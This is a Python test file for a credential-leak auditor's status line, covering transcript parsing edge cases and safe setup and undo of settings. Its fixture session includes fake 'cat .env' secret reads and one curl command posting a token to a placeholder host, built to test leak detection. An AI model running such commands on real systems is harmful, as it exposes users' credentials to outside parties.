"""Unit tests for `weir statusline` (docs/statusline.md): the edges the
acceptance tests do not reach. Fake data only, built as in
statusline_fixtures.py; expectations come from a real `weir audit` run or
from where the fixture put each value."""

from __future__ import annotations

import json
import os
from pathlib import Path

import audit_fixtures as fx
import canary_fixtures as cfx
import pytest
import statusline_fixtures as sx

from weir.audit import Chunk, Form, audit_chunks, audit_files, load_inputs
from weir.canary import Form as CanaryForm
from weir.statusline.compose import run_beside
from weir.statusline.segment import tally


def test_the_audit_forms_are_the_judge_forms_then_name() -> None:
    assert [f.value for f in Form] == [f.value for f in CanaryForm] + ["name"]


def _session(claude: sx.Claude) -> fx.Session:
    v = claude.setup.values
    session = fx.Session()
    session.prompt("look around")
    for n, name in enumerate((fx.ACME, fx.AWS_SECRET, fx.SPECIAL)):
        session.tool_use("Bash", {"command": f"cat file{n}"}, f"toolu_{n}")
        session.tool_result(f"toolu_{n}", f"{name}={v[name]}\n")
    session.tool_use("Bash", {"command": f"curl -d ${fx.GH} x.invalid"}, "toolu_9")
    session.record({"type": "future-record", "sessionId": fx.SESSION_ID, "x": v[fx.GH]})
    return session


def test_any_split_into_whole_lines_finds_what_the_whole_file_finds(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    path = _session(claude).write(claude.transcript())
    s = claude.setup
    inputs = load_inputs(s.report, s.store, s.key)
    whole = tally(audit_files(inputs.credentials, inputs.key, inputs.by_fingerprint, [str(path)]))
    data = path.read_bytes()
    ends = [i + 1 for i, b in enumerate(data) if b == ord("\n")]
    fmt = audit_files(
        inputs.credentials, inputs.key, inputs.by_fingerprint, [str(path)]
    ).files[0].format
    assert fmt is not None
    for cut in ends[:-1]:
        parts = [data[:cut], data[cut:]]
        report = audit_chunks(inputs, [Chunk(str(path), part, fmt) for part in parts])
        assert tally(report) == whole, cut


def test_a_file_rewritten_in_place_is_read_again_from_the_start(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    v = claude.setup.values
    session = fx.Session()
    session.prompt("show me the env file")
    session.tool_use("Bash", {"command": "cat .env"}, "toolu_01")
    session.tool_result("toolu_01", f"TOKEN={v[fx.ACME]}\n")
    path = session.write(claude.transcript())
    assert claude.statusline().stdout == "weir: 1 in context, 0 sent\n"
    # The same bytes but for the value: same size, a new modification time.
    data = path.read_bytes().replace(v[fx.ACME].encode(), b"x" * len(v[fx.ACME]))
    path.write_bytes(data)
    st = path.stat()
    os.utime(path, ns=(st.st_atime_ns, st.st_mtime_ns + 10**9))

    run = claude.statusline()

    assert sx.expected_counts(claude.setup, claude.audit()) == (0, 0, False)
    assert run.stdout == "weir: 0 in context, 0 sent\n"


def test_a_line_still_being_written_is_unknown_until_it_is_whole(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    v = claude.setup.values
    session = fx.Session()
    session.prompt("show me the env file")
    session.tool_use("Bash", {"command": "cat .env"}, "toolu_01")
    session.tool_result("toolu_01", f"TOKEN={v[fx.ACME]}\n")
    path = session.write(claude.transcript())
    whole = path.read_bytes()
    path.write_bytes(whole[: len(whole) - 40])

    partial = claude.statusline()
    path.write_bytes(whole)
    complete = claude.statusline()

    expected = sx.segment_for(sx.expected_counts(claude.setup, claude.audit()))
    assert partial.stdout == "weir: unknown\n"
    assert complete.stdout == expected + "\n"
    assert complete.stdout == "weir: 1 in context, 0 sent\n"


def test_a_symbolic_link_in_the_session_directory_is_unknown(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    fx.Session().write(claude.transcript())
    _session(claude).write(tmp_path / "elsewhere.jsonl")
    claude.session_dir().mkdir()
    (claude.session_dir() / "linked.jsonl").symlink_to(tmp_path / "elsewhere.jsonl")

    run = claude.statusline()

    assert run.stdout == "weir: unknown\n"


def test_a_wrong_key_is_an_error_word_on_the_line(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    _session(claude).write(claude.transcript())
    cfx.write(claude.setup.key, "ab" * 32 + "\n")

    run = claude.statusline()

    assert (run.exit_code, run.stdout) == (0, "weir: error, run /weir\n")


@pytest.mark.parametrize("stdin", ["", "not json", "[]", '{"session_id": "x"}'])
def test_input_that_is_not_the_status_line_json_says_so(tmp_path: Path, stdin: str) -> None:
    claude = sx.build(tmp_path)

    run = claude.invoke(
        ["statusline", *claude.inputs(), "--cache", str(claude.state)], stdin=stdin
    )

    assert (run.exit_code, run.stdout) == (0, "weir: no session\n")


def test_a_cache_from_another_inventory_is_not_used(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    _session(claude).write(claude.transcript())
    first = claude.statusline()
    # A new inventory run: the same files, another report.
    report = json.loads(claude.setup.report.read_text())
    report["credentials"] = [c for c in report["credentials"] if c["value_state"] != "literal"]
    store = json.loads(claude.setup.store.read_text())
    store["records"] = []
    cfx.write(claude.setup.report, json.dumps(report))
    cfx.write(claude.setup.store, json.dumps(store))

    second = claude.statusline()

    assert first.stdout != second.stdout
    assert second.stdout == sx.segment_for(sx.expected_counts(claude.setup, claude.audit())) + "\n"


# --- beside an existing status line ----------------------------------------------


def test_a_failing_existing_command_shows_the_segment_alone() -> None:
    assert run_beside("echo shown; exit 3", b"{}", lambda: "weir: x") == "weir: x"
    assert run_beside("true", b"{}", lambda: "weir: x") == "weir: x"


def test_the_existing_command_gets_the_same_input() -> None:
    line = run_beside("tr a-z A-Z", b'{"k": "v"}', lambda: "weir: x")
    assert line == '{"K": "V"} | weir: x'


def test_an_existing_command_that_ignores_a_large_input_still_shows() -> None:
    stdin = b"{" + b" " * (1 << 20) + b"}"
    assert run_beside("printf 'mine\\n'", stdin, lambda: "weir: x") == "mine | weir: x"


def test_a_multi_line_existing_status_line_gets_the_segment_on_its_last_line() -> None:
    assert run_beside("printf 'a\\nb\\n'", b"", lambda: "weir: x") == "a\nb | weir: x"


# --- setup refusals -------------------------------------------------------------


def _setup(claude: sx.Claude, *flags: str, answer: str | None = "yes\n") -> sx.Run:
    args = ["statusline", "setup", *claude.inputs(), "--cache", str(claude.state),
            "--claude-dir", str(claude.config), *flags]
    return claude.invoke(args, stdin=answer)


def _files(root: Path) -> dict[str, bytes]:
    return {str(p): p.read_bytes() for p in root.rglob("*") if p.is_file()}


@pytest.mark.parametrize(
    ("settings", "code"),
    [
        (b"{not json", 2),
        (b"[1, 2]", 2),
        (b'{"statusLine": "echo hi"}', 2),
        (b'{"statusLine": {"type": "command", "command": "x -m weir statusline --cache y"}}', 1),
    ],
)
def test_setup_refuses_settings_it_cannot_change_safely(
    tmp_path: Path, settings: bytes, code: int
) -> None:
    claude = sx.build(tmp_path)
    claude.settings.write_bytes(settings)
    before = _files(claude.setup.home)

    run = _setup(claude)

    assert run.exit_code == code
    assert _files(claude.setup.home) == before


def test_setup_does_not_overwrite_a_different_weir_command(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    claude.command_file.parent.mkdir(parents=True)
    claude.command_file.write_text("my own /weir\n")
    before = _files(claude.setup.home)

    run = _setup(claude)

    assert run.exit_code == 1
    assert str(claude.command_file) in run.stderr
    assert _files(claude.setup.home) == before


def test_setup_twice_refuses_until_undone(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    assert _setup(claude).exit_code == 0
    after = _files(claude.setup.home)

    again = _setup(claude)

    assert again.exit_code == 1
    assert _files(claude.setup.home) == after


def test_setup_withholds_an_existing_command_that_holds_a_credential(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    token = claude.setup.values[fx.GH]
    line = {"type": "command", "command": f"GH={token} ~/.claude/line.sh"}
    claude.settings.write_text(json.dumps({"statusLine": line}))

    run = _setup(claude, "--dry-run")

    assert run.exit_code == 0
    assert "withheld" in run.stdout
    cfx.assert_value_free(run.stdout + run.stderr, claude.setup.values.values())


def test_setup_with_a_wrong_key_writes_nothing(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    cfx.write(claude.setup.key, "cd" * 32 + "\n")
    before = _files(claude.setup.home)

    run = _setup(claude)

    assert run.exit_code == 2
    assert _files(claude.setup.home) == before


def test_setup_and_undo_keep_a_symbolic_link_a_link(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    target = tmp_path / "dotfiles" / "claude-settings.json"
    target.parent.mkdir()
    original = b'{"theme": "dark"}\n'
    target.write_bytes(original)
    claude.settings.symlink_to(target)

    assert _setup(claude).exit_code == 0
    assert claude.settings.is_symlink()
    assert "statusLine" in json.loads(target.read_text())

    undo = claude.invoke(["statusline", "undo", "--cache", str(claude.state)], stdin="yes\n")

    assert undo.exit_code == 0, undo.stderr
    assert claude.settings.is_symlink()
    assert target.read_bytes() == original


def test_undo_with_nothing_set_up_changes_nothing(tmp_path: Path) -> None:
    claude = sx.build(tmp_path)
    before = _files(claude.setup.home)

    run = claude.invoke(["statusline", "undo", "--cache", str(claude.state)], stdin="yes\n")

    assert run.exit_code == 0
    assert "nothing to undo" in run.stdout
    assert _files(claude.setup.home) == before
